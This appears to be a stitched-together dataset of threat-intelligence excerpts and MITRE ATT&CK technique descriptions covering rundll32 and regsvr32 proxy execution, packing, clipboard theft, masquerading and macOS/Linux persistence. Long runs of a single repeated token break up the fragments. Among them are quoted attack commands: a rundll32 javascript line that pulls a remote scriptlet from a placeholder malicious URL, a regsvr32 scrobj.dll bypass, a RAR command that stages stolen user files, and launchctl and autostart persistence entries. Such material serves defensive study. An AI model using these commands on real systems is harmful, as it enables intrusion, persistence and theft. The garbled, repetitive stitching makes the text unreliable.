The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\Environment\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed
The loader component is executed via RUNDLL32.EXE
Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1
If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe
If the string is present, the malware executes the command RunDll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
rundll32.exe
Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).

Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) 
It loads the module with parameter vShow set to zero, which opens the application with a hidden window.  Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe
regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.    The script attempts to load the malicious module using regsvr with the run function.   Procmon shows the malicious module loaded to the Avast process
The malicious modules in regsvr32.exe memory After the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded
If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available
The Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.   The downloaded modules found in regsvr32.exe as detected by the Cybereason platform
The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:       regsvr32.exe /s /n /u /i:%TEMP%\12-B-366.txt scrobj.dll     The use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module
After selecting a payload URL, the script will create copies of certutil and regsvr32 to the temp directory for later use
8 Making a copy of certutil and regsvr32 Certutil.exe (a copy is renamed to certis.exe by the trojan) is normally used in a windows environment to manage certificates, but in this case, it is used by the second stylesheet to download the malware payloads
11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits
19-1 regsvr32 running the .dlls  Fig
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
regsvr32.exe
Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)
After unpacking the module, it is packed with an additional inner packer Pe123\RPolyCryptor
BlackEnergy2 was eventually seen downloading more crimeware plugins – a custom spam plugin and a banking information stealer custom plugin
It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind
Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits
The PCODE of the virtual machine is packed with the aplib packer
An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed
While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed
The MSIL file contains the packed core payload in its .Net resource section
Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX
Two modifications are made to UPX version 3.91:  The magic bytes UPX! in the UPX header are replaced with ASS7, The decompressed code and strings sections are XORed with 0x01
Figure 6: Difference between a stock UPX packed file and the modified one A patch for UPX is available on ESET’s malware-research Github repository that allows unpacking Keydnap’s backdoor with the usual upx -d
See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! …or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn’t show any similarities with previously known malware
Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes
(Source: Dell SecureWorks) In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards packed JavaScript code shown in Figure 9 to the end of a legitimate website's menu page
First, the sample is UPX packed
Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) 

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  
Data Exfiltration The second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate
Cadelspy’s main payload contains its back door functionality, allowing the threat to carry out the following activities:  Log keystrokes and the titles of open windows Gather clipboard data and system information Steal printer information and any documents that were sent to be printed Record audio Capture screenshots and webcam photos  Cadelspy compresses all of the stolen data into a .cab file and uploads it to the attacker’s C&C servers
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
Clipboard stealer 
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
OpenClipboard()  
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 GetClipboardData() 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 pbpaste 
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
 OnDrawClipboard
Adversaries may collect data stored in the clipboard from users copying information within or between applications. 

In Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)
Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:  Config with a similar set of plugins for different architectures Here is the list of retrieved files and related functionality:    weap DDoS Attack (various types)   ps password stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)   nm scans ports, stores banners   snif logs IP source and destination, TCP/UDP ports   hook main module: CnC communication, config parser, plugins loader   uper rewrites hook module with a new version and launches it     Weap, Snif, Nm plugin grammar mistakes and mis-spellings The developers’ coding style differed across the ‘Hook’ main module, the plugins, and the Windows main.dll
Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\16)
Mimikatz The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in commonly exploited by EternalBlue to move laterally to other systems on the network.
Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.

Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)
What changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not
This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat
Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta    nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35    rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0    Table 5
Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta   hb.exe 3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62 Hobocopy   nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35   rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0   tardigrade.exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392 Tardigrade application
CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset
In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\windows\temp\svchost.exe a -m5 -v2000m -hp{password} -inul -r "{destination_file.rar}" "{multiple user directories linked to the victim's projects}" -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives
SHA256  a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff   MD5 1ff40e79d673461cd33bd8b68f8bb5b8   Compiled 2017.08.06 11:32:36 (GMT), 2.22   Type I386 Windows Console EXE   Size 101 888    Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:    Parameter Description   -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration
The file is named netwf.dat
For example, APT32 installed one backdoor as a persistent service with a legitimate service name that had a Unicode no-break space character appended to it
The account names visually look similar to legitimate government organization names or other trusted third-party entities
The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload
Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension   3
The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program
Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity
The “VPN Client” is a legitimate Juniper VPN software bundled with Helminth,  a malware in use by the OilRig threat agnet: JuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed
For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to “%TEMP%\flash_update.exe” that was a legitimate Flash Player installer
Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities:  Drops a copy of itself in %AppData%\svchost.exe\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11)
Firstly, the reason this has been named MirageFox instead of just Mirage, is because in the Export directory for the modules, the name field is filled with a string MirageFox_Server.dat
SHA256 Filename PowerShell Filename Variant   5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe   d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NET    Table 1
The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe
After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name
The Downloader After the exploit or script executes, the system downloads install.exe, which has the following metadata: MD5             5a0c4e1925c76a959ab0588f683ab437 Size            46592 bytes Compile Time    2014-11-19 08:55:10Z Import Hash     6b8611f8148a6b51e37fd68e75b6a81c The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path “C:\Users\Public”, which fails on Windows XP because that path is not present by default
One example of these samples is given below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb The file is a self-extracting RAR, which is a common delivery mechanism for PlugX particularly when the eventual payload will be sideloaded by a legitimate executable
Filename qrat.exe   File Size 1093120 bytes   MD5 c05e5131b196f43e1d02ca5ccc48ec0e   SHA1 f28c592833f234c619917b5c7d8974840a810247   Notes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll
Filename  Part-I.doc    File Size  11349102 bytes    MD5  92942c54224cd462dd201ae11a560bb8    SHA1  85a21624df2211af3daf05c86a3fbea8271059d3    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe
Filename  Part-II.doc    File Size  10156713 bytes    MD5  e32668e569362c96cc56db368b7e821e    SHA1  dadc493abbe3e21610539e1d5a42f523626a6132    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-audio.exe
Filename  vsrss.exe    File Size  446976 bytes    MD5  5c3456d5932544b779fe814133344fdb    SHA1  7ab750afb25457a81c27a98dc6dfd51c27e61b0e    Notes Delphi RAT file that beacons to ebeijingcn.live
When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\Microsoft\DeviceSync\VMwareCplLauncher.exe %PROGRAMDATA%\Microsoft\DeviceSync\vmtools.dll %PROGRAMDATA%\Microsoft\DeviceSync\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload
The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool
These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders
In one instance we observed, one of the initial malware delivered to the victim, RATANKBA (TROJ_RATANKBA.A), connects to a legitimate but compromised website (eye-watch[.]in:443, a mobile application-selling site) from which a hack tool (nbt_scan.exe) is also downloaded
One archive sample analyzed by CTU researchers contained a legitimate PDF file, a benign image of interest to targets (see Figure 8), and an HttpBrowser installer disguised as an image file
The legitimate owaauth.dll file resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\ while CTU researchers have observed the backdoor using the same filename in the %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\ directory
It was pretending to be an Adobe flash player update installer on a compromised website to lure users to click for the execution

Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.
likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor
It named Meterpreter as a WAV file type, probably in the hope that this would not raise suspicions
Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)
Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)
The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel
Using a custom User Agent string or the system's User Agent string derived from urlmon.dll   7
Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login
Persistence Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots
From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation
Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.

 Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.
 
Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) 
Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami
The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent
The webshell will save the archives locally to the server in the C:\Users\Public\Libraries\Recorded\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network
There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field
This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems
The same code snippets are combined into a second stage JavaScript in “C:\Users\<User Name>\”
The username appears to be attacker specified and has occurred in 2017 Bankshot samples
This links the previous samples with this unique username
If the Trojan does not have root privileges to enable its automatic launch, it creates the “~/.config/autostart/dbus-inotifier.desktop” file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= “/home/user/” stands here for the environment variable HOME
Note that the username could be a small joke on the attackers’ part regarding the attribution to FIN7
The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list “.plist” for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)
Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables
The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\Users\<username>\AppData\Roaming\Out.jpg
code(2343)", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\Users\<username>\AppData\Local\Temp\SystemDiskClean.ps1
File is dropped to C:\Users\%USERNAME%\AppData\Roaming\Microsoft Network\microsoft_network\1.0.0.0\microsoft_network.exe
File starts as mico-audio.exe and installs to C:\Users\%USERNAME%\AppData\Roaming\google-chrome\crome.exe
